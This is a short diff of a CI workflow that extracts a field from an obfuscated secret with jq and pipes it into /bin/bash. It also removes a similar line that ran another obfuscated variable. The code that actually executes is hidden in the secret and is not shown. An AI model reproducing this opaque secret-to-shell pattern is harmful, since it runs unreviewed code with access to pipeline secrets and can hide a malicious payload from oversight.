@@ -17,7 +17,6 @@ jobs:
           znzb504: ${{ secrets.znzb504 }}
         run: |
           printf '%s' "$znzb504" | jq -r .axqna33873 | /bin/bash
-          echo $sgu8296 | jq -r .knm1825 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
